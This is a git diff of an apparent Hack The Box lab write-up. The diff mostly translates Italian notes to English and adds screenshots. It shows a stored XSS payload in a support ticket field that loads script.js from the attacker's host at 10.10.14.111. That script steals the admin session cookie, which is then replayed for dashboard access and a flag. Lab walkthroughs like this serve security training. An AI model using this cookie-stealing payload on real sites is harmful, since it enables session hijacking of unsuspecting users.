@@ -959,7 +959,12 @@ Table: company
 
 ![](./vhosts/support/support1.png)
 
-the page is a support center 
+the page is a support center, where the two main functionalities are to buy and to raise a ticket.
+
+The /ticket.php endpoint is vulnerable to XSS, which is used to capture the admin cookie session:
+
+![](./vhosts/support/support2.png)
+
 script.js:
 
 ```javascript
@@ -989,9 +994,11 @@ start a server with both files:
 sudo php -S 0.0.0.0:80
 ```
 
-incolla nel campo Message
+The following script is then pasted in the Message field as shown above:
 
 "><script src="http://10.10.14.111/script.js"></script>
+
+the cookie is then captured:
 
 ```
 sudo php -S 0.0.0.0:80
@@ -1011,8 +1018,13 @@ sudo php -S 0.0.0.0:80
 ^C                                                                         
 ```
 
-metti il cookie con cookie editor 
+the cookie is added using cookie editor:
 
+![](./vhosts/support/support3.png)
+
+By clicking on Login now is it possible to access the admin dashboard and capture the flag:
+
+![](./vhosts/support/support4.png)
 HTB{1nS3cuR3_c00k135}
 
 |Ticket ID|Ticket Name|Status|
@@ -1025,6 +1037,8 @@ HTB{1nS3cuR3_c00k135}
 
 
 ## tracking.inlanefreight.local
+
+![](./vhosts/tracking/tracking1.png)
 
 ```javascript
 <script>
